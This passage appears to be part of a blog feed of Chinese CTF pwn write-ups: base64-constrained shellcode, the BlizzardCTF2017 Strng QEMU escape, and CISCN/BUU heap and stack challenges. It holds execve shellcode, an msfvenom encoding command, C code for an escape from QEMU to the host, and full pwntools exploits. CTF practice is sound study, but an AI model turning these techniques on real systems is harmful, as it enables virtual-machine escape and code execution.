(*)(void))v5)();\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555015.jpeg)\n\n这里v7是输入的Buf，v5是mmap分配的内存空间。之后的语句：代表了将v5对应的内存空间强制转化为函数指针并且调用，在汇编代码中也可以看出来：这里的[ebp+var_18]就是我们输入的buf经过编码base64编码后存放的地方。\n\n```\n#注释头\n\ntext:0804879C var_18          = dword ptr -18h\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555021.jpeg)\n\n3.所以我们输入的内容就成了会被执行的汇编代码，也就是可以输入Shellcode，来执行我们需要的命令。这里可以看一个连接网址，从里面找shellcode：\n\nhttp://shell-storm.org/shellcode/\n\n可以通过linux/x86/sh/bash/execve/shellcode等等关键词来查找，这里直接给出一个可用的shellcode:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555344.jpeg)\n\n \n\n```\n#注释头\n\n\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\n```\n\n4.但是有Base64_encode，所以我们输入的需要会被base64编码，而base64编码只能由只由0-9，a-z，A-Z，+，/这些字符组成，(这里就是对应的ascii转换表中内容)所以常规的shellcode就不合格，我们这里选中的shellcode中某些字符就没办法被base64编码，所以这里需要用到msfvenom来选择一个可用的编码器，将我们常规的shellcode编码成可以被base64编码的shellcode。\n\n5.打开Linux，输入msfvenom -l encoders可以查看编码器，后面有介绍，可以看一下，从中选择一个可用的编码器对shellcode进行编码即可。\n\n6.查到x86/alpha_mixed这个编码器可以将我们输入的shellcode编码成大小写混合的代码，符合条件。\n\nx86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder\n\n运行编码器的代码如下：\n\npython -c 'import sys; sys.stdout.write(\"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload\n\n7.输入这段代码运行之后可以看到当前文件夹目录下生成了一个payload文件，文本打开就可以看到编码后的shellcode:\n\nPYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA\n\n8.之后需要将这段可以被Base64编码的进行Base64解码，得到的shellcode再被程序中的Base64编码后才是我们真正起作用的shellcode。利用python脚本即可。\n\n \n\n \n\n \n\n▲\n\n1.’import sys; sys.stdout.write(“shellcode”)’：这是导入包之后写入编码的shellcode。\n\n2.由于msfvenom只能从stdin中读取，所以使用Linux管道符”|”来使得shellcode作为python程序的输出。\n\n3.此外配置编码器为x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为payload的文件中。\n\n4.由于在b-64-b-tuff中是通过指令call eax调用shellcode的eax,所以配置BufferRegister=EAX。最后即可在payload中看到对应的被编码后的代码。这段shellcode代码就可以被base64编码成我们需要的汇编代码。\n\n \n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"BlizzardCTF2017-Strng","url":"/2021/08/14/BlizzardCTF2017-Strng/","content":"\n1.打开虚拟环境，然后都说flag在/root/flag，给的也不是vmlinux，那么就应该是qemu逃逸。\n\n2.由于只有文件，大佬们都直接告诉用户名密码，也没说怎么找，那就当作本来题目给了用户名和密码。用户名是ubuntu，密码是passw0rd。\n\n3.将qemu-system-x86_64拖到IDA中开始分析，会分析很长一段时间，先看看启动参数，launch.sh：\n\n```\n./qemu-system-x86_64 \\\n    -m 1G \\\n    -device strng \\\n    -hda my-disk.img \\\n    -hdb my-seed.img \\\n    -nographic \\\n    -L pc-bios/ \\\n    -enable-kvm \\\n    -device e1000,netdev=net0 \\\n    -netdev user,id=net0,hostfwd=tcp::5555-:22\n```\n\n没啥好注意的，显示加载了设备strng，那么这应该就是需要分析的PCI设备。然后最后一行netdev user,id=net0,hostfwd=tcp::5555-:22，把22端口重定向到了宿主机的5555端口，所以使用ssh ubuntu@127.0.0.1 -p 5555进去。同时这里注意加载内存要1G，为了防止崩溃，我改成了128M。\n\n4.然后进入qemu中看看设备信息，好找到mmio和pmio的地址：\n\n(1)首先输入lspci，可以看到有一个Unclassified device\n\n00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)\n\n这个就应该是strng设备了。\n\n(2)加载IDA完成之后验证一下，函数栏搜索strng，查看相关函数。先查看设备初始化函数：strng_class_init。(这里需要将变量k的类型设置为PCIDeviceClass*)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502012.jpeg)\n\n可以看到加载了strng设备，然后设备号device_id是0x11e9，vendor_id是0x1234，对应在qemu中查看一下刚才猜测的strng设备，输入：lspci -v -s 00:03.0\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502897.jpeg)\n\n可以看到猜测没错。同时可以看到对应的mmio地址为0xfebf1000，大小256。pmio的地址为0xc050，大小8。\n\n▲有时候这些命令可能不好使，判断完设备号之后，可以输入：\n\nhexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/config来查看\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502926.jpeg)\n\n5.之后从read和write函数中找漏洞：\n\n这里将第一个参数opaque修改下类型为：struct STRNGState*，至于为什么是这个，打开read和write的汇编代码，很明显发现有STRNGState*，然后再跳转到结构体界面中找，虽然不太好找。找到之后双击，可以显示出结构体的所有成员，发现就是需要的那个：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502018.jpeg)\n\n(1)先看strng_mmio_read函数，读入addr并按二进制将其右移两位，相当于除以4，之后将结果作为regs数组的索引，返回该regs[add>>2]的值。同时还需要注意的是addr的低两位只能为0，否则过不了if ( size == 4 && !(addr & 3) )的检查。\n\n(2)再看strng_mmio_write函数：\n\n当size等于4时，将addr右移两位得到寄存器的索引idx，并提供4个功能：\n\n①当idx为0时，调用srand函数但并不给赋值给内存。当i为1时，调用rand得到随机数并赋值给regs[1]。\n\n②当idx为3时，调用rand_r函数，使用regs[2]的地址作为参数，最后将返回值赋值regs[3]，但后续仍然会将val值覆盖到regs[3]中，就是迷惑用的，实际功能也就是将传入的value赋值给regs[3]。\n\n▲但是这里的传regs[2]的地址也是一个关键，如果我们能将rand_r函数劫持为system函数，然后在regs[2]中放入\"cat /root/flag\"字符串，那不就可以调用system(\"cat /root/flag\")从而读取flag了吗。\n\n其余则直接将传入的value赋值给regs[idx]。\n\n那么通过控制addr，进而控制idx>=2，就可以逐次将4个字节数据写入到regs[idx]上。\n\n▲按理说如果将idx超出regs数组范围，64之后，那么不就可以任意越界写了吗，但是这里不行，因为传入的addr是不能大于mmio的大小，pci设备内部会进行检查，而刚好regs的大小为256，所以无法通过mmio进行越界读写。\n\n(3)接着看strng_pmio_read函数：当传入的端口地址addr为0时，直接返回opaque->addr，否则将opaque->addr右移两位作为索引idx，返回regs[idx]的值。这个opaque->addr在strng_pmio_write中被赋值。\n\n(4)然后再看strng_pmio_write函数：\n\n当size等于4时，以传入的端口地址为判断提供4个功能：\n\n①当传入的端口地址addr为0时，直接将传入的value赋值给opaque->addr。\n\n②当传入的端口地址addr不为0时，将opaque->addr右移两位得到索引idx，分为三个功能：\n\nA.idx为0时，执行srand，返回值不存储。\n\nB.idx为1时，执行rand并将返回结果存储到regs[1]中。\n\nC.idx为3时，调用rand_r并将regs[2]的地址作为第一个参数，返回值存储到regs[3]中。\n否则直接将value存储到regs[idx]中。\n\n▲这里就可以调用strng_pmio_write函数，形成任意地址写漏洞。\n\nA.通过将addr设置为0，然后使得传入的value直接赋值给opaque->addr，使得opaque->addr形成的索引idx大于64，将reg[idx]越界指向rand_r函数指针。\n\nB.然后再次调用strng_pmio_write函数，传入不为0的addr。通过opaque->addr形成的索引idx，使得regs[idx]指向rand_r函数指针，将value越界写入rand_r，劫持rand_r函数。\n\n6.那么总的利用过程就清楚了：\n\n(1)通过strng_mmio_write函数，将regs[2]赋值为\"cat /root/flag\"。\n\n(2)通过strng_pmio_write函数，将rand_r函数劫持为system函数。\n\n之后再调用strng_mmio_write函数，使得idx为3，然后将regs[2]的地址作为参数，调用rand_r函数，从而调用system(\"cat /root/flag\")获取flag。\n\n7.但是现在还需要system函数的地址，通过上面分析，可以发现有一个越界读漏洞：\n\n(1)通过strng_pmio_write函数设置opaque->addr，使得opaque->addr形成的索引idx大于64，进而使得regs[idx]指向srand函数。\n\n(2)通过strng_pmio_read函数，借助修改后的opaque->addr，读取idx索引regs[idx]指向的内容，也就是srand函数指针中的内容，对应的就是srand函数地址。\n\n(这里大多数的exp都是针对srandom函数来泄露libc的，但rand或者rand_r应该也都可以)\n\n8.那么现在总的利用过程就是泄露libc地址，然后改写rand_r函数为system函数，将\"cat /root/flag\"写入到regs[2]，之后通过rand_r(regs[2])来调用system(\"cat /root/flag\")从而获得flag。\n\n9.开始编写poc：\n\n(1)写好访问pmio和mmio空间的调用函数，及前置参数：\n\n```\n#注释头\n\nunsigned char* mmio_mem;\nuint32_t pmio_base=0xc050;\n\nvoid die(const char* msg)\n{\n    perror(msg);\n    exit(-1);\n}//用来打印错误信息，退出用的，不写也没关系\n\nvoid mmio_write(uint32_t addr, uint32_t value)\n{\n    *((uint32_t*)(mmio_mem + addr)) = value;\n}\n\nuint32_t mmio_read(uint32_t addr)\n{\n    return *((uint32_t*)(mmio_mem + addr));\n}\n\nuint32_t pmio_write(uint32_t addr, uint32_t value)\n{\n    outl(value,addr);\n}\n\n\nuint32_t pmio_read(uint32_t addr)\n{\n    return (uint32_t)inl(addr);\n}\n```\n\n(2)打开resource0文件，利用mmap将mmio空间映射出来：\n\n```\n//注释头\n\n// Open and map I/O memory for the strng device\nint mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:03.0/resource0\", O_RDWR | O_SYNC);\nif (mmio_fd == -1)\n    die(\"mmio_fd open failed\");\n\nmmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\nif (mmio_mem == MAP_FAILED)\n    die(\"mmap mmio_mem failed\");\n\nprintf(\"mmio_mem @ %p\\n\", mmio_mem);\n```\n\n(3)对mmio空间进行写操作，调用strng_mmio_write函数，将\"cat /root/flag\"写入到regs[2]中：\n\n```\n//注释头\n\nmmio_write(8,0x20746163);\nmmio_write(12,0x6f6f722f);\nmmio_write(16,0x6c662f74);\nmmio_write(20,0x6761);\n```\n\n这里由于需要满足传入的addr右移两位后形成的idx需要>=2，所以从8依次开始。\n\n(4)编写pmio空间越界读和越界写的函数：\n\n```\nuint32_t pmio_arbread(uint32_t offset)\n{\n    pmio_write(pmio_base+0,offset);\n    return pmio_read(pmio_base+4);\n}\n\nvoid pmio_abwrite(uint32_t offset, uint32_t value)\n{\n    pmio_write(pmio_base+0,offset);\n    pmio_write(pmio_base+4,value);\n}\n```\n\n(5)利用pmio空间越界读取漏洞，泄露libc地址：\n\n```\n//注释头\n\nif (iopl(3) !=0 )\n    die(\"I/O permission is not enough\");\n\n// leaking libc address\nuint64_t srandom_addr=pmio_arbread(0x108);\nsrandom_addr=srandom_addr<<32;\nsrandom_addr+=pmio_arbread(0x104);\n//这里的都是为了设置idx从而读取用的\n\nprintf(\"leaking srandom addr: 0x%llx\\n\",srandom_addr);\nuint64_t libc_base= srandom_addr-0x43bb0;\nuint64_t system_addr= libc_base+0x4f440;\nprintf(\"libc base: 0x%llx\\n\",libc_base);\nprintf(\"system addr: 0x%llx\\n\",system_addr);\n//不同的主机环境的libc版本不同，需要修改\n```\n\n(6)利用越界写，将rand_r函数改写成system函数\n\n```\n//注释头\n\n// overwrite rand_r pointer to system\npmio_abwrite(0x114,system_addr&0xffffffff);\n\nmmio_write(0xc,0);//补0\n```\n\n最后编译：gcc -m32 -O0 -static -o exp exp.c，然后传到虚拟机里面，可以用下列两种方法：\n\n①scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu，由于开了端口，所以可以直接通过scp端口传输。\n\n②使用python库简易搭建一个ftp传输：\n\n```\n#注释头\n\n#主机中运行\npython2 -m SimpleHTTPServer\n\n#qemu中运行，其中ip地址需要改变一下，对于主机ip\nwget -O ./exp http://192.168.80.132:8000/exp\n```\n\n最后可以看到成功运行：这里我修改了cat /root/flag命令，变成/bin/sh，可以看到返回了一个主机里面的终端sh，成功实现逃逸。但是这个终端sh输入命令不显示，回显消息比较慢，但是个确确实实的主机终端，如果有条件的话，应该是可以实现多重逃逸的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502953.jpeg)\n\n \n\n▲qemu逃逸调试：\n\n1.将exp传进qemu之后，在主机上使用命令ps aux|grep qemu，找到qemu的任务id，然后gdb attach qemu_id。\n\n2.下断点在需要的函数：b *strng_mmio_write，然后输入c接着运行。\n\n3.在qemu中sudo ./exp，现在就能在主机的gdb中停下来，就可以调试了。\n\n```\n#注释头\n\np *strng\np strng.regs[1]\np strng.srand\n```\n\n \n\n \n\n参考资料：\n\nhttps://xz.aliyun.com/search?keyword=qemu\n\nhttps://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup\n","tags":["qemu题"],"categories":["QEMU","qemu-escape"]},{"title":"CISCN-BUU刷题记录2","url":"/2021/08/14/CISCN-BUU刷题记录2/","content":"\n1.ciscn_2019_es_1：UAF，tcache dup，比较常规，泄露地址，打free_hook。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_es_1\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"27956\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice:\"\n\n\ndef add(size, con, call):\n    sla(menu, \"1\")\n    sla(\"compary's name\\n\", str(size))\n    sa(\"name:\\n\", con)\n    sla(\"compary call:\\n\", str(call))\n\ndef delete(idx):\n    sla(menu, \"3\")\n    sla(\"index:\\n\", str(idx))\n\ndef show(idx):\n    sla(menu, \"2\")\n    sla(\"index:\\n\", str(idx))\n\n#main_arena_off = 0x3ebc40\n\nadd(0x410,\"A\",123) #0\nadd(0x18,\"B\",123) #1\nadd(0x08,\"/bin/sh\\x00\",123) #2\n\ndelete(0)\nshow(0)\nru(\"name:\\n\")\nmalloc_hook = u64(rc(6).ljust(8,\"\\x00\")) - 96 - 0x10\nobj = LibcSearcher(\"__malloc_hook\",malloc_hook)\nlibc_base = malloc_hook - obj.dump(\"__malloc_hook\")\nlog.info(\"libc_base:0x%x\"%libc_base)\nfree_hook = libc_base + obj.dump('__free_hook')\nsystem_addr = libc_base + obj.dump('system')\ndelete(1)\ndelete(1)\nadd(0x18,p64(free_hook),123) #3\nadd(0x18,p64(system_addr),123) #4\nadd(0x18,p64(system_addr),123) #5\ndelete(2)\npause()\np.interactive()\n```\n\n2.ciscn_s_9：这题有点意思，栈溢出长度比较短，但是还是够用来泄露地址然后ret2libc。除此之外题目中给了一个hint，可以直接借用jump esp这个gadget来手写shellcode，拉动esp上移到我们输入位置，这样就不再需要考虑到劫持ebp上挪之后的函数剩下的汇编代码。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./ciscn_s_9\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"26029\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n#sh has been in ELF\n'''\nsh_addr = 0x080482EA\npayload = \"\"\npayload += \"A\"*(0x48+0x4)\npayload += p32(system_plt)\npayload += p32(0x11111111) #paddding(system_plt ret addr)\npayload += p32(sh_addr)\n'''\n\n\n#sh not in ELF\n'''\npayload = \"\"\npayload += \"A\"*0x10\npayload += p32(read_plt)\npayload += p32(system_plt)\npayload += p32(0x1) #fd\npayload += p32(binsh_addr) #parameter\npayload += p32(0x4) #n\npayload += p32(binsh_addr)\n'''\n\n#leak addr\n'''\npayload1 = \"\"\npayload1 += \"A\"*0x10\npayload1 += p32(puts_plt)\npayload1 += p32(main_addr)\npayload1 += p32(puts_got)\n\npayload2 = \"\"\npayload2 = \"A\"*0x10\npayload2 += p32(system_plt)\npayload2 += p32(0x11111111) #paddding(system_plt ret addr)\npayload2 += p32(binsh_addr)\n'''\n\njump_esp = 0x08048554\n\nshellcode= '''\nxor ecx,ecx\nxor edx,edx\npush edx\npush 0x68732f2f\npush 0x6e69622f\nmov ebx,esp\nxor eax,eax\nmov al,0xB\nint 0x80\n'''\nshellcode=asm(shellcode)\n\npayload = \"\"\npayload += shellcode\npayload = payload.ljust(0x24,\"A\")\npayload += p32(jump_esp)\npayload += asm(\"sub esp,40;call esp\")\n\nru(\">\\n\")\npause()\nsl(payload)\npause()\np.interactive()\n```\n\n3.ciscn_final_2：这题真是最有意思了，调了我快一天。\n\n(1)bool公用，dup free之前必须先申请。\n\n(2)int_pt和short_int_pt全局。\n\n(3)开了seccomp保护，但是最开始加载了flag，句柄fd设置为666。\n\n▲漏洞在没有清空指令，可以UAF和tcache dup。先常规思考一下思路，UAF和tcache dup泄露堆地址，之后构造chunk进入unsortedbin中，泄露libc地址，然后利用堆块上残留的libc地址部分写覆盖_IO_2_2_stdin_结构体中的fileno为666，这样在choice>4就可以利用scanf来直接读取句柄fd中的内容，也就是flag，顺带打印出来。\n\n其它不说，需要注意的也就是一个printf的格式化输出，泄露堆地址的时候用int接收，然后判断一下是否小于0，小于0则加上0x100000000即可。\n\n主要说libc地址泄露和利用。这里利用部分堆地址进行一定堆布局，修改int_chunk的size为0x4b1，这里我弄大了，只要超过tcache最大限制即可。(然后我看网上常规思路都是填满大于fastbin的tcache，但是我嫌比较麻烦，就用了自己的方法，事实证明大佬的方法其实更有效，比较不容易出错)然后就比较坑爹了。\n\n①由于只有部分libc地址，所以两个选择，一是爆破，0x7fxx--------，需要大概爆破一个字节，0xff次。二是利用chunk上残留的地址，结合tcache up和UAF直接改后面四个字节，直接申请到我们想要地方。这里用第二种方法\n\n②但是最坑爹的就是，scanf申请堆块啊，具体不知道申请多大，但是程序中可以输入99个字符，调试了好久，指定会申请堆块。\n\n③如果直接利用int_chunk上残留的libc地址，但是这时候int_chunk已经被放入到unsortedbin中，结合tcache up和UAF势必会修改int_chunk的fd，然后就会造成unsortedbin被破坏，再加上之后的scanf申请堆块，不会从0x20和0x30的tcache中申请，得，直接崩溃：\n\nmalloc(): memory corruption: 0x00007fae88dc8c10 ***\\n\"\n\n④然后我又想到要不为scanf预留一个chunk到tcache中？这样就不会从unsortedbin中切割了。结果调好久没调出来，果断放弃。\n\n⑤最后灵光一闪，想到干嘛不直接劫持tcache结构体，由于int_chunk被放入unsortedbin中，那么如果int_chunk也在tcache中，就可以使得tcache结构体中0x30链表上留下main_arena+96的指针了啊。这样再申请short_chunk到这里，直接修改指针，再申请int_chunk就会申请到我们修改的地方，这样就不会造成unsortedbin破坏。\n\n▲看了大佬的，还是直接填满tcache省事，不破坏unsortedbin。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_2\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.26.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"29139\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"which command?\\n> \"\n\n\ndef add(Type, con):\n    sla(menu, \"1\")\n    sla(\">\", str(Type))\n    sa(\"your inode number:\", con)\n\ndef delete(Type):\n    sla(menu, \"2\")\n    sla(\">\", str(Type))\n\ndef show(Type):\n    sla(menu, \"3\")\n    sla(\">\", str(Type))\n\ndef exit(con):\n    sla(menu,\"4\")\n    #sa(\"at last?\\n\",con)\n\n\nadd(1,\"B\")\ndelete(1)\n\nfor i in range(0,5):\n    add(2,\"A\")\n    delete(1)\n\nshow(1)\nru(\"type inode number :\")\nheap_low_four = int(ru(\"\\n\"))\nif(heap_low_four<0):\n    heap_low_four += 0x100000000\nlog.info(\"heap_low_four:0x%x\"%heap_low_four)\n\nfor i in range(0,3):\n    add(1,str(heap_low_four))\n    delete(2)\n\nadd(2,str(heap_low_four-0x10))\nadd(2,str(heap_low_four-0x10))\nadd(2,str(0x4b1))\n\n#fill\nfor i in range(0,32):\n    add(2,str(0x51))\n\ndelete(2)\nadd(1,str(heap_low_four))\nadd(1,str(heap_low_four))\ndelete(1)\nshow(1)\nru(\"type inode number :\")\n\nmalloc_hook = int(ru(\"\\n\"))- 96 - 0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\n\nlibc_base_four = malloc_hook - obj.dump('__malloc_hook')\nif(libc_base_four<0):\n    libc_base_four += 0x100000000\nheap_base = heap_low_four-0x260\nlog.info(\"libc_base_four:0x%x\"%libc_base_four)\n__IO_2_1_stdin_fileno_addr = libc_base_four+obj.dump(\"_IO_2_1_stdin_\")+0x70\n\nadd(1,str(malloc_hook+0x10+96))\ndelete(2)\nadd(2,str(heap_base+0x50+0x8))\nadd(2,str(__IO_2_1_stdin_fileno_addr))\nadd(2,str(__IO_2_1_stdin_fileno_addr))\nadd(1,str(666))\n\npause()\n\np.sendline(\"4\")\np.interactive()\n```\n\n这里我都是int_chunk拿来泄露地址和利用，short_chunk来打辅助。\n\n★另外记录下tcache方面的，tcache根源在于tcache结构体，所以如果tcache的bin中如下：\n\n0x20[]:chunkA->chunkA.fd=1\n\n那么如果这时候申请chunkA的同时修改chunkA.fd=2，对于的tcache的bin中只会是：\n\n0x20[]:chunkA.fd=1，而不是chunkA.fd=2，因为在malloc时就已经将chunkA.fd=1放到tcache结构体中了，再修改chunkA.fd是没有意义的，只能修改tcache结构体才行。\n\n★还有tcache的cout字段一直是个谜，如果cout>7，tcache的max宏定义没有被改，那么释放后的chunk是不会进入对于的tcache的bin中。但是如果cout<7或者<0，是不会有其他影响的，只会看tcache结构体中对应bin的链表中是不是0x0。是就当没有，有数据则就有chunk在该bin中，不管cout是多少(<7)，并且malloc或者free后会对cout对应加减。(不同libc版本好像又不太一样，具体调试)\n","tags":["刷题"],"categories":["PWN"]},{"title":"CISCN2021东北赛区复现","url":"/2021/08/14/CISCN2021东北赛区复现/","content":"\n复现之前，先骂两句。SB形式，SB的自己。\n\n1.hard:这道题目最他丫SB，上来运行不起来，环境调半天，还是运行不起来，再加上VPN崩溃，一直连不上，还以为题目本身优点问题，只能先放弃，转头帮忙去了。后来checksec一下才发现依赖是./lib/，也就是当前文件下需要创建一个lib文件夹，里面放上ld-linux-x86-64.so.2才能运行，我可去他大爷的。\n\n给的分挺高，后面想了想也不算难，主要有三个点。\n\n(1)任意写时修改的地方选择。\n\n(2)calloc传入的nnum为0时，不会申请，会返回0。同样也具备mmap的功能。\n\n(3)最开始初始化的时候，setbuf传入的是_IO_2_1_stdxx的结构体，该结构体在调用scanf，get，printf等需要初始化缓冲区的函数时，会写入缓冲区地址，也就是Libc上某个区域，可以借此联合setbuf来泄露地址。\n\n比赛后和学长交流一下，才想到把最后的puts改成main，我真他丫是个SB，然后就很正常了。\n\n①由于Partial Reload，可以改got表，所以先任意写，将puts改成main，循环程序。\n\n②将exit改成init处的setbuf的地方，将setbuf改成printf，这样再进入init的地方时，就会打印处_IO_2_1_stdxx的结构体的值。\n\n③由于打印_IO_2_1_stdxx的结构体的值时，打印处flag之后就会被0x00截断，所以需要修改flag处的值。这里通过calloc输入过大的nnum时会从mmap申请内存，返回的是mmap空间，也就是libc上的地址。同时由于关闭了PIE，偏移不会发生改变，所以直接调试计算偏移即可。\n\n④泄露地址后，同样利用calloc申请mmap的方法，将calloc_got改成one_gadget即可。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwn\"\nlibc_file = \"/lib/x86_64-linux-gnu/libc-2.31.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = 